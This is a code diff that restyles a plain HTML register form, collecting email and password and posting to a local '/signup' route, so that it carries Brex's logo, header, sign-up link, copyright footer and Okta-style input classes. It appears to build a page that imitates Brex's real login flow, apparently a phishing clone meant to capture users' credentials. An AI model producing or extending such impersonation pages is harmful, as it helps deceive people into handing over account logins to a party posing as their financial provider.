@@ -8,16 +8,22 @@
     <link rel="icon" href="/favicon.ico" />
   </head>
   <body>
-    <div class="row">
-      <div class="col-4"></div>
-      <div id="register-container" class="col-4">
+
+    <div class="layout">
+<div class="layout__header v2"><a class="logo" href="/" aria-label="Brex logo"><svg viewBox="0 0 279 74"><path d="M188.792 15.1867C183.843 15.1867 180.027 16.9514 176.485 20.6376V16.0439H166.763V61.2331H177.224V35.0258C177.224 29.0251 180.793 25.2287 186.208 25.2287C187.192 25.2287 188.054 25.3512 188.669 25.4737L195.93 15.9215C193.1 15.4316 190.638 15.1867 188.792 15.1867Z" fill="currentColor"></path><path d="M279 16.0444H266.939L255.801 30.7842L244.663 16.0444H232.602L249.618 38.8141L232.602 61.2336H244.91L255.74 46.9396L266.57 61.2336H279L261.869 38.8521L279 16.0444Z" fill="currentColor"></path><path d="M59.3201 5.87826C55.7511 10.6544 54.8896 12.2464 51.4436 12.2464H0V73.4783H20.1836C24.7372 73.4783 29.1678 71.2739 31.9984 67.6C35.6905 62.7015 36.1828 61.2319 39.7519 61.2319H91.3185V0H71.0118C66.4582 0 62.0277 2.20435 59.3201 5.87826ZM75.3193 45.4341H53.7819C49.1052 45.4341 44.7978 47.3935 41.9671 51.1899C38.275 56.0884 37.5366 57.558 34.0906 57.558H15.8761V28.1667H37.4135C42.0902 28.1667 46.3977 25.9623 49.2283 22.2884C52.9204 17.5123 53.905 16.0428 57.2279 16.0428H75.3193V45.4341Z" fill="currentColor"></path><path d="M152.605 30.371C157.159 27.7993 160.359 23.2681 160.359 17.2674C160.359 8.45 153.59 0 143.744 0H114.207V61.2319H143.744C154.451 61.2319 161.835 53.6392 161.835 44.087C161.835 38.4536 159.251 33.5551 152.605 30.371ZM124.668 9.55218H142.883C147.436 9.55218 150.144 13.8384 150.144 17.6348C150.144 22.2884 146.082 25.4725 142.267 25.4725H124.668V9.55218ZM142.267 51.6797H124.668V35.0247H142.883C147.559 35.0247 151.374 39.066 151.374 43.2297C151.374 47.8834 146.575 51.6797 142.267 51.6797Z" fill="currentColor"></path><path d="M222.143 48.2519C220.42 50.9461 217.097 52.5381 213.405 52.5381C207.621 52.5381 202.821 48.6193 202.821 42.6186H234.081C234.573 40.7816 234.697 39.9244 234.697 38.3323C234.697 24.6164 226.205 15.1867 213.405 15.1867C200.852 15.1867 191.991 24.1265 191.991 38.6997C191.991 52.9055 200.483 62.0903 213.651 62.0903C222.882 62.0903 231.004 57.5592 233.343 48.2519H222.143ZM213.405 24.7389C219.19 24.7389 223.62 28.4128 223.497 33.9236H202.944C202.944 28.5352 207.621 24.7389 213.405 24.7389Z" fill="currentColor"></path></svg></a><div class="layout__header-content"><div class="layout__header-content"><div class="layout__header_v2-message">New to Brex?</div><a class="link__button" href="https://dashboard.brex.com/signup">Sign up</a></div></div></div>
+
+
+
+    <div class="layout__content v2">
+      <div id="register-container">
         <form action="/signup" method="POST">
           <div class="container">
             <h1>Register</h1>
 
             <label for="email"><b>Email</b></label>
-            <input type="text" placeholder="Enter Email" name="email" id="email" required>
+            <input class="o-form-input" type="text" placeholder="Enter Email" name="email" id="email" required>
 
+            <span data-se="o-form-input-username" class="o-form-input-name-username o-form-control okta-form-input-field input-fix"><input type="text" placeholder="" name="username" id="idp-discovery-username" value="" aria-label="" autocomplete="username" aria-required="true" required=""></span>
             <label for="psw"><b>Password</b></label>
             <input type="password" placeholder="Enter Password" name="psw" id="psw" required>
 
@@ -32,7 +38,10 @@
           </div>
         </form>
       </div>
-      <div class="col-4"></div>
     </div>
+
+<div class="layout__footer v2"><div class="layout__footer__copyright">Copyright © 2022 Brex Inc.</div><div class="layout__footer-link-separator"></div><a target="_blank" rel="noreferrer noopener" href="https://brex.com/legal">Brex Platform Agreement</a><div class="layout__footer-link-separator">|</div><a target="_blank" rel="noreferrer noopener" href="https://brex.com/privacy">Privacy Policy</a></div>
+
+</div>
   </body>
 </html>
